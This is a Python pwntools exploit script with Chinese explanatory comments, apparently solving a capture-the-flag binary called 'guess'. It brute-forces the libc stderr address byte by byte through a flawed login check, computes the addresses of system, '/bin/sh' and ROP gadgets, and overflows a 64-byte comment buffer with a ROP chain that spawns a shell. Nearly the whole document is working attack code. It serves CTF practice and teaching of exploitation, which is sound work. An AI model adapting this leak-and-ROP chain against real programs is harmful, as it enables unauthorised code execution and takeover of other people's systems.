from pwn import *

# 使用pwn中的工具创建进程打开程序，并可以进行交互
io = process('./guess')

# 使用pwn中的工具查看libc.so由此可以在之后获取我们需要的信息
# /lib/x86_64-linux-gnu/libc.so.6 地址由命令行指令 ldd guess 可以得到
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#   char account[256]; // [rsp+10h] [rbp-220h] BYREF
#   char password[16]; // [rsp+110h] [rbp-120h] BYREF
#   FILE *v4; // [rsp+120h] [rbp-110h]
#   v4 = stderr;
#   ...
#   for ( i = 0; i < strlen(account); ++i ){
#     if ( account[i] != password[i] ){
#       puts("Login fail");
#       return ...;
#     }
#   }
#   sub_91A();
#   return ...;

# 以上是账户匹配的伪代码，可以发现：
# password[16]后是stderr的地址；
# account的判断机制是匹配strlen(account)位字符；
# 因此可以填充account前16位后，枚举stderr的地址guess是否正确；


prebytes=b'' # 用于存储已经猜对的字节
stderr_addr=0 # 用于存储libc中stderr的基地址

for i in range(6):
    for j in range(1, 256):
         # 枚举当前字节的值,每次枚举8位
         # 接收到"Choice:"之后，发送"1"并换行
        io.sendlineafter(b'Choice:', b'1')  
        
        # 令account和password前16字节均相等
        account =  b'0123456789ABCDEF' 
        password = b'0123456789ABCDEF' 
        account = account + prebytes + bytes([j])
        # print("guessing {", account ,"}")
        io.sendafter(b'Account:', account)
        io.sendafter(b'Password:', password)

        # 接收到 `l` 之后，停止接收
        ret = io.recvuntil(b'l') 
        if (ret != b' Login fail'):
            stderr_addr = j * (256 ** i) + stderr_addr # 计算libc中stderr的地址(注意x86-64是小端序)
            prebytes += bytes([j])
            if i != 5:
                io.sendlineafter(b'comments:', b'AByteHasBeenStolen!HHH') 
            break

print("stderr_addr: ", hex(stderr_addr))

# 动态库中函数的相对位置等于还未重定向的libc中的函数相对位置
# 因此可以由stderr在内存中的位置计算其余函数的位置

# 通过stderr_addr计算libc中system()的地址
# libc.symbols为字典类型(例如{aa,bb,cc}),记录了libc中各个函数的地址
system_addr = stderr_addr + libc.symbols["system"] - libc.symbols["_IO_2_1_stderr_"]
print("system_addr: ", hex(system_addr))

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh" 得到 0x00000000001d8698
bin_sh_addr = stderr_addr - libc.symbols["_IO_2_1_stderr_"] + 0x00000000001d8698
print("bin_sh_addr: ", hex(bin_sh_addr))

# gadget1: pop $rdi; ret
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" 得到 0x000000000002a3e5
gadget1_addr = stderr_addr - libc.symbols["_IO_2_1_stderr_"] + 0x000000000002a3e5
print("gadget1_addr: ", hex(gadget1_addr))

# gadget2: ret
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "ret" 得到 0x0000000000029cd6
gadget2_addr = stderr_addr - libc.symbols["_IO_2_1_stderr_"] + 0x0000000000029cd6
print("gadget2_addr: ", hex(gadget2_addr))

# hack comments:
#   char v1[64]; // [rsp+10h] [rbp-50h] BYREF
#   int i; // [rsp+50h] [rbp-10h]
#   unsigned __int64 v3; // [rsp+58h] [rbp-8h]

# 先随便输入64位
# v1为(rbp - 0x50)，所以ra的地址应该是v1 + 0x58 = rsp + 0x68，由于循环会使i++，把i赋值成0x57，替换栈顶元素：

#
#
# rsp+80h          system_addr         system()
# rsp+78h          gadget2_addr        ret
# rsp+70h          bin_sh_addr         /bin/sh
# rsp+68h (ra)     gadget1_addr        pop $rdi ; ret
# rsp+60h (rbp)

# pop $rdi 会把rdi修改成bin_sh_addr完成了参数的传递
# gadget2_addr的目的是为了使rsp+8，能够16位对齐
comments = b'a' * 64 + bytes([0x57]) + p64(gadget1_addr) + p64(bin_sh_addr) + p64(gadget2_addr) + p64(system_addr) + b'\x0a'

io.sendafter(b'comments:', comments)


# interactive()：进入交互模式，即将程序的输入输出改为终端的输入输出
io.interactive()